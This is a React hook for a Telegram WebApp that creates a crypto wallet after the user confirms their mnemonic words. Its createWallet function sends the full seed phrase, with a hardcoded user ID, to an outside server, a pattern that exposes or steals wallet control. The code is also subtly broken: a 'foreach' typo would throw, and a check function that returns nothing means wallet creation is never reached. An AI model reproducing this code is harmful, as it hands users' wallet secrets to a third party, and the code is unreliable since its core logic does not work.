import React, { useCallback, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import BackButton from '../../../constants/BackButton';
import MainButton from '../../../constants/MainButton';
import axios from 'axios';

const useButton = ({step, setStep, keys, values, setMistakes, mistakes}) => {
    
    const navigate = useNavigate()

    useEffect( () => {
        const mistakesCopy = [false, false, false ,false ,false, false]
        console.log(keys);
        
        if (mistakes.includes(true)){
            keys.foreach((e, i) => {
                if (e != values[i]){
                    mistakesCopy[i] = true
                }
            })
            if (mistakesCopy.join(" ") !== mistakes.join(' ')){
                setMistakes(mistakesCopy)
            }
        }
        console.log("Воу");
    } , [values, mistakes, keys] )


    const backFunction = useCallback( () => {
        if (step){
          setStep(0)
        }
        else{
          navigate(-1)
        }
      } , [step, navigate, setStep] )
    
      
      useEffect( () => {
        BackButton.show()
        BackButton.onClick(backFunction)
        return () => {
          BackButton.offClick(backFunction)
        }
      } , [backFunction])
    
    
    
      const checkFunction = useCallback( () => {
          const mistakesCopy = [false, false, false, false, false, false]
          keys.forEach((element, i) => {
            if (element !== values[i]){
              mistakesCopy[i] = true
            }
          });
          setMistakes(mistakesCopy)
      }, [keys, values, setMistakes] )


      const createWallet = useCallback( async () => {
        const response = await axios.post("https://www.connectbirga.ru/user/wallet", {
            mnemonic: keys,
            userId: 2144832745,
          });
      } , [] )
    
      const saveFunction = useCallback( () => {
          if (checkFunction()){
            createWallet().then(value => {
                navigate("/")
            }).catch(value => {
                alert("Кошелек не был создан, причина : " + JSON.stringify(value))
            })
          }
          else{
            window.Telegram.WebApp.HapticFeedback.notificationOccurred("error")
          }
      } , [checkFunction] )
    

      useEffect( () => {
    
    
        const forwardFunction = () => {
          if (step === 0){
            setStep((value) => (value + 1))
          }
          else{
            saveFunction()
          }
        }
    
        
        if (step === 0){
          MainButton.setText("ПРОДОЛЖИТЬ")
        }
        else{
          MainButton.setText("СОЗДАТЬ КОШЕЛЕК")
        }
    
    
        MainButton.show()
        MainButton.onClick(forwardFunction)
        return () => {
          MainButton.offClick(forwardFunction)
        }
      } , [step, saveFunction, setStep] )

    
};

export default useButton;